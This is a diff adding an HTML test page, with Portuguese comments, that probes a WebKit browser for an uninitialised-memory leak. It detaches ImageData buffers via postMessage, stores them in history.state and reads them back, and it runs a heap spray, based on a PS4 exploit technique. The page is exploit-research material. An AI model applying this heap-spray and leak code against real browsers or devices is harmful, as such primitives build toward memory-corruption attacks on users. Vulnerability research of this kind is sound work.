@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>TEST 07 - ImageData Heap Spray via history.state</title>
+</head>
+<body>
+
+<h2>TEST 07 - ImageData Heap Spray via history.state</h2>
+<p>Alvo: heap leak / uninit memory read via ImageData + history.state</p>
+<p>API: ImageData, postMessage, history.pushState, history.state</p>
+<p>Base: tecnica documentada em exploit PS4 4.55 (setAttributeNodeNS UAF write-up)</p>
+<p>Objetivo: pushState com ImageData transferido cria buffer nao-inicializado acessivel via history.state.data.buffer</p>
+
+<pre id="log">Aguardando inicio...</pre>
+<button onclick="testHistoryLeak()">TESTE HISTORY LEAK</button>
+<button onclick="testHeapSpray()">HEAP SPRAY COMPLETO</button>
+
+<script>
+var log = document.getElementById('log');
+
+function append(msg) {
+  log.textContent += '\n' + msg;
+}
+
+function testHistoryLeak() {
+  append('[07] Testando ImageData + history.state leak...');
+
+  try {
+    // Criar ImageData de tamanho que alinha bem no heap
+    // 0x4000 pixels * 4 bytes = 65536 bytes (64KB) - tamanho comum de chunk
+    var imgData = new ImageData(1, 0x4000);
+    append('[07] ImageData criado: ' + imgData.data.byteLength + ' bytes');
+
+    // Transferir buffer via postMessage (detacha o backing store)
+    postMessage("", "*", [imgData.data.buffer]);
+    append('[07] postMessage com ImageData.data.buffer: buffer detachado');
+    append('[07] imgData.data.buffer.byteLength apos transfer: ' + imgData.data.buffer.byteLength);
+
+    // Empurrar estado para history com objeto que referencia o ImageData
+    var state = {data: imgData, marker: 0xDEAD1337};
+    history.pushState(state, '', location.href);
+    append('[07] history.pushState com estado contendo ImageData');
+
+    // Acessar history.state imediatamente
+    var recovered = history.state;
+    if (recovered && recovered.data) {
+      append('[07] history.state.data recuperado!');
+      append('[07] history.state.data.buffer.byteLength: ' + recovered.data.data.buffer.byteLength);
+
+      // Tentar ler o buffer - pode conter memoria nao-inicializada
+      try {
+        var view = new Uint32Array(recovered.data.data.buffer);
+        var sample = [];
+        for (var i = 0; i < Math.min(16, view.length); i++) {
+          sample.push('0x' + view[i].toString(16));
+        }
+        append('[07] Primeiros 16 Uint32 do buffer: ' + sample.join(', '));
+        append('[07] SE VALORES NAO ZERO: possivel leak de memoria nao-inicializada!');
+      } catch(e) {
+        append('[07] Leitura do buffer excecao: ' + e.message);
+      }
+    } else {
+      append('[07] history.state nao continha data (comportamento esperado em browsers patched)');
+    }
+
+  } catch(e) {
+    append('[07] testHistoryLeak excecao: ' + e.message);
+  }
+}
+
+function testHeapSpray() {
+  append('[07] Heap spray via ImageData multiplos + historia...');
+
+  var SPRAY_SIZE = 256; // numero de ImageDatas no spray
+  var leaked_views = [];
+
+  try {
+    // Fase 1: Spray de objetos JS no heap para controlar layout
+    var spray_objs = [];
+    for (var i = 0; i < 10000; i++) {
+      spray_objs.push({
+        a: i, b: i * 2, c: i * 3, d: i * 4,
+        marker: 0xCAFEBABE + i
+      });
+    }
+    append('[07] Fase 1: ' + spray_objs.length + ' objetos JS no heap');
+
+    // Fase 2: Criar e transferir ImageDatas de varios tamanhos
+    var sizes = [
+      0x1000,   // 4KB
+      0x4000,   // 16KB
+      0x10000,  // 64KB
+      0x40000,  // 256KB
+    ];
+
+    for (var s = 0; s < sizes.length; s++) {
+      var h = sizes[s];
+      var img = new ImageData(1, h);
+      append('[07] ImageData ' + h + ' pixels = ' + img.data.byteLength + ' bytes');
+
+      // Transferir buffer
+      postMessage("", "*", [img.data.buffer]);
+
+      // Tentar acessar via pushState imediatamente apos transfer
+      history.pushState({img: img, size: h, round: s}, '', location.href);
+
+      var st = history.state;
+      if (st && st.img && st.img.data) {
+        try {
+          var v = new Uint32Array(st.img.data.buffer);
+          var nonzero = 0;
+          for (var j = 0; j < v.length; j++) {
+            if (v[j] !== 0) nonzero++;
+          }
+          append('[07] Size ' + h + ': buffer len=' + v.length + ' | non-zero words: ' + nonzero);
+          if (nonzero > 0) {
+            append('[07] *** POSSIVEL UNINIT MEMORY: ' + nonzero + ' palavras nao-zero! ***');
+            leaked_views.push(v);
+          }
+        } catch(e2) {
+          append('[07] View excecao para size ' + h + ': ' + e2.message);
+        }
+      }
+    }
+
+    append('[07] Total de views com leak potencial: ' + leaked_views.length);
+    if (leaked_views.length > 0) {
+      append('[07] RESULTADO INTERESSANTE: investigar conteudo dos views');
+    } else {
+      append('[07] Sem leak obvio. WebKit nesta versao pode inicializar buffers zerados.');
+    }
+
+  } catch(e) {
+    append('[07] testHeapSpray excecao: ' + e.message);
+  }
+}
+</script>
+
+</body>
+</html>
